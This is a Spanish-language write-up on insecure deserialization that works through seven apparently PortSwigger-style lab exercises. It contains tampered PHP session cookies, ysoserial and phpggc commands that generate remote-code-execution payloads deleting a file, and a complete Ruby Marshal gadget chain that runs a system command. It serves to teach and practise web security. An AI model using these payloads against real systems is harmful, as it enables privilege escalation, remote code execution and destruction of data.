-----
### QUE ES?
La **Insecure Deserialization** es una vulnerabilidad que ocurre cuando una aplicación **deserializa datos controlados por el usuario sin validarlos correctamente**.  
La deserialización consiste en convertir datos (normalmente almacenados o enviados como texto o binario) **de nuevo en objetos del programa**.  
Si un atacante modifica esos datos antes de que se deserialicen, puede **alterar propiedades del objeto o ejecutar código malicioso**.  
Esto puede permitir **bypass de autenticación, escalada de privilegios o incluso ejecución remota de código (RCE)**.
#### PASOS:
- _IDENTIFICAR DATOS SERIALIZADOS:_ *(Base64, JSON, Java objects, PHP serialize, etc).*
- _DECODIFICAR LOS DATOS:_ `base64 -d` o herramientas como **Burp Decoder** para ver la estructura del objeto.
- _MODIFICAR PROPIEDADES DEL OBJETO:_ Cambiar campos como `user`, `role`, `isAdmin`.
- *INSPECCINAR LA PAGINA EN BUSCA DE RUTAS RARAS*
- *PROBAR BACKUPS*
- *PROBAR APACHE COMMONS*
#### APUNTES:
- Funciones que permiten ejecución remota de comandos en *DESERIALIZACIóN* → `Python: Pickle, PHP : unserialize(), Java: ObjectInputString, Ysoserial`
- *Boolean* se pone a 1, *String* se pone a 0 para "activarlo".
- *Métodos especiales* que se invocan al deserializar: 
	-  `__wakeup()`
	- `__destruct()`
	- `readObject()`
	- `toString()`

**Ejemplo típico (cookie manipulada):**
`Cookie: session=Tzo0OiJVc2VyIjozOntzOjQ6InVzZXIiOiJhZG1pbiI7czo0OiJyb2xlIjoiYWRtaW4iO30=`
Al modificar propiedades del objeto antes de que el servidor lo deserialice, el atacante puede **convertirse en admin o ejecutar código dependiendo del lenguaje y las clases disponibles**.
### LAB1 MODIFIYING SERIALIZED OBJECTS
En este primer lab nos encontramos una cookie de session que parece estar codificada en base64 tras loguearnos. Si le pasamos el raton por encima veremos que pone algo como `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}` podemos tratar de cambiar valor de `b:0` a `b:1` (boolean) de forma que podamos elevar nuestros privilegios.
### LAB2 MODIFYING SERIALIZED DATA TYPES
En este lab nos encontramos de nuevo con una cookie de session que parece estar en base64 que al decodificarla se ve tal que así: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fc64b0v2cfc7cvods7z79mm00qlhqrf0";}`. Si la modificamos un poco podremos ver que en el error dice que usa `PHP` podemos probar si es una version antigua `7.x` en las que la comparación con strings tenia fallos. Lo dejamos así: `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}` de esta forma conseguimos privilegios como administrador.

En **PHP 7.x y versiones anteriores**, la combinación de **`unserialize()`**, comparaciones débiles (`==`) y el **type juggling** de PHP podía provocar fallos de lógica.  Si se comparaba un **entero `0`** con una **cadena no numérica**, PHP convertía automáticamente la cadena a `0`. Por ello, expresiones como `0 == "cualquiercosa"` podían evaluarse como `true`.
### LAB3: USING APPLICATION FUNCTIONALITY TO EXPLOIT INSECURE DESERIALIZATION
En este lab nos encontramos de nuevo con una cookie de session que parece estar en base64 que al decodificarla se ve tal que así: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kqpfyjjpj45hci1j3i6rf4vjafyirjfd";s:11:"avatar_link";s:19:"users/wiener/avatar";}` ademas vemos un botón para borrar nuestra cuenta. Podemos intentar modificar la ruta para tratar de eliminar algún archivo de otro usuario. 
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kqpfyjjpj45hci1j3i6rf4vjafyirjfd";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
### LAB4: ARBITRARY OBJECT INJECTION IN PHP
En este lab nos encontramos de nuevo con una cookie de session que parece estar en base64 y si hacemos *Ctrl + U* podemos ver que se referencia a un archivo `/lib/CustomTemplate.php` si intentamos realizar una petición para poder verlo no nos dejará, pero podemos probar a mirar su copia de seguridad que se crea a veces `/lib/CustomTemplate.php~` ahi podemos ver el método `__destruct()` que  invoca `unlink()` sobre el atributo *lock_file_path* (borra el archivo de esta ruta). Podemos probar a manipular el atibuto desde la cookie de sesión: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"csexvv96fy32344wnn09474o7jrjxexc";}` por: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` para eliminar el archivo de carlos.
### LAB5: EXPLOITING JAVA DESERIALIZATION WITH APACHE COMMONS
En este lab nos encontramos de nuevo con una cookie de session que parece estar encodeda: `rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBjMm96czQxeGxhYWIxc2k5ZHRyNmQ5dmM3aG9ycmJiYXQABndpZW5lcg==` podemos probar si usa alguna de las librerías de **Apache** como *CommonsCollections4*. 
Para ello podemos usar un *POC* de github https://github.com/frohoff/ysoserial  y descargamos el .jar que nos permite generar un código en *base64* que meteremos en la cookie para eliminar un fichero de carlos.
`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt | base 64`
### LAB6: EXPLOITING PHP DESERIALIZATION WITH A PRE-BUILT GADGET CHAIN 
En este lab nos encontramos de nuevo con una cookie de session que parece estar encodeda y firmada: `{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJydnVyb24wOHcwazJhd2NlaGY4MjMzdmM4YXdtOTN1NSI7fQ==","sig_hmac_sha1":"7771ef8c489a67277bcecb94ffda91c2e2c1b6asdfasdfgasdfgasddc"}` 
Si provocamos un error vemos que usa **PHP** podemos intentar listar el `/cgi-bin/phpinfo.php` y usar un *POC* que explota las librerias comunes de php. En github esta el repositorio https://github.com/ambionics/phpggc lo clonamos y listamos las librerías `./phpgppc -l | grep Symfony`. Podemos crear el payload con `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt`
### LAB7: EXPLOITING RUBY DESERIALIZATION USING A DOCUMENTED GADGET CHAIN
En este lab nos encontramos de nuevo con una cookie de session que parece estar encodeda: `BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVia2hxYnBkaXZsYXVheTRyNmozbDhrY2gwZDlvcGN3egY7B0YK` si producimos un error vemos que usa *ruby*.
Podemos buscar https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html donde viene toda la explicación y el payload. Generamos la nueva cookie desde onlinegdb.com que es un compilardor ruby onlyne con el siguiente payload:
```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```